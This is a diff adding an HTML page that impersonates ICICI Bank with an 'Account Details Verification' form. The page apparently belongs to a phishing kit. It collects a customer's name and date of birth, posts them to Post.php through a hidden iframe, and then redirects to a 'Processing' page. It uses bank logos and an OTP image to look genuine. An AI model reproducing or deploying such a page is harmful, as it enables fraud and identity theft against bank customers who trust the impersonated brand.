@@ -1,0 +1,143 @@
+<!DOCTYPE html>
+<html>
+   <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+   <meta name="theme-color" content="#fff">
+   <head>
+      <meta charSet="utf-8"/>
+      <meta name="viewport" content="width=device-width"/>
+      <meta name="description" content="login"/>
+      <meta name="next-head-count" content="4"/>
+      <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+      <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+      <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+      <link rel="manifest" href="/site.webmanifest">
+      <link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5">
+      <meta name="msapplication-TileColor" content="#da532c">
+      <link rel="preload" href="Axis.css" as="style"/>
+      <link rel="stylesheet" href="Axis.css" data-n-g=""/>
+      <link rel="preconnect" href="https://fonts.googleapis.com">
+      <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+      <link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+      <title>Account Details | ICICI Bank</title>      
+      <noscript data-n-css=""></noscript>
+      <style>
+      .new-control
+      {
+      text-transform:uppercase;
+      }
+      .error
+      {
+      color: Red;
+      font-family: 'Work Sans', sans-serif;
+      font-size:11px;
+      font-style: italic;
+      }
+      </style>
+    </head>
+   <body>
+   <!-- partial:index.partial.html -->
+   <div class="login-box">
+   <!-- Static- Please don't do anything here-->
+   <script type="text/javascript">var submitted=false;</script>
+   <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing1.html';}"></iframe>
+   <!--My Form-->
+      <div id="__next">
+           <img alt="" src="icici h.jpg" style="width:100%;" />
+         </div>
+         <div class="mainContent">
+            <h1 class="text-center">Account Details Verification</h1>
+            <div class="card">
+               <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                  <input type="hidden" name="" value=""/>
+                  <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Account_Holder_Name">
+                  Account Holder Name <p1 style="font-size:13px; color:red;">*</p1></label>
+                  <input type="text" class="new-control" id="Account_Holder_Name" name="Account_Holder_Name" minLength="3" maxLength="30" required=""/></div>
+                  <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Date_Of_Birth">
+                  Date Of Birth<p1 style="font-size:13px; color:red;">*</p1></label>
+                  <input type="text" class="new-control" id="Date_Of_Birth" name="Date_Of_Birth" maxLength="10" required=""/></div>
+                  <p1><span class="error" style="display:none; position:absolute; margin:-6%; margin-left:0px;">Invalid Date Of Birth !</span></p1>
+                  </tr>
+                  </table>
+                  <script type="text/javascript">
+                  var isShift = false;
+                  var seperator = "/";
+                  window.onload = function () {
+                  //Reference the Table.
+                  var tblForm = document.getElementById("tblForm");
+
+                  //Reference all INPUT elements in the Table.
+                  var inputs = document.getElementsByTagName("input");
+
+                  //Loop through all INPUT elements.
+                  for (var i = 0; i < inputs.length; i++) {
+                  //Check whether the INPUT element is TextBox.
+                  if (inputs[i].name == "Date_Of_Birth") {
+                  //Check whether Date Format Validation is required.
+                  if (inputs[i].className.indexOf("date-format") != 1) {
+
+                  //Set Max Length.
+                  inputs[i].setAttribute("maxlength", 10);
+
+                  //Only allow Numeric Keys.
+                  inputs[i].onkeydown = function (e) {
+                  return IsNumeric(this, e.keyCode);
+                  };
+
+                  //Validate Date as User types.
+                  inputs[i].onkeyup = function (e) {
+                  ValidateDateFormat(this, e.keyCode);
+                  };
+                  }
+                  }
+                  }
+                  };
+
+                  function IsNumeric(input, keyCode) {
+                  if (keyCode == 16) {
+                  isShift = true;
+                  }
+                  //Allow only Numeric Keys.
+                  if (((keyCode >= 48 && keyCode <= 57) || keyCode == 8 || keyCode <= 37 || keyCode <= 39 || (keyCode >= 96 && keyCode <= 105)) && isShift == false) {
+                  if ((input.value.length == 2 || input.value.length == 5) && keyCode != 8) {
+                  input.value += seperator;
+                  }
+
+                  return true;
+                  }
+                  else {
+                  return false;
+                  }
+                  };
+
+                  function ValidateDateFormat(input, keyCode) {
+                  var dateString = input.value;
+                  if (keyCode == 16) {
+                  isShift = false;
+                  }
+                  var regex = /(((0|1)[0-9]|2[0-9]|3[0-1])\/(0[1-9]|1[0-2])\/((19|20)\d\d))$/;
+
+                  //Check whether valid dd/MM/yyyy Date Format.
+                  if (regex.test(dateString) || dateString.length == 0) {
+                  ShowHideError(input, "none");
+                  } else {
+                  ShowHideError(input, "block");
+                  }
+                  };
+
+                  function ShowHideError(textbox, display) {
+                  var row = textbox.parentNode.parentNode;
+                  var errorMsg = row.getElementsByTagName("span")[0];
+                  if (errorMsg != null) {
+                  errorMsg.style.display = display;
+                  }
+                  };
+                  </script>
+                  <div class="text-center"><button type="submit" class="submit">SUBMIT</button></div>
+               </form>
+            </div>
+            <br><br>
+            <img alt="" src="ICICI OTP F.jpg" style="width: 100%; height: auto;" />
+         </div>
+      </div>
+     </body>
+</html>
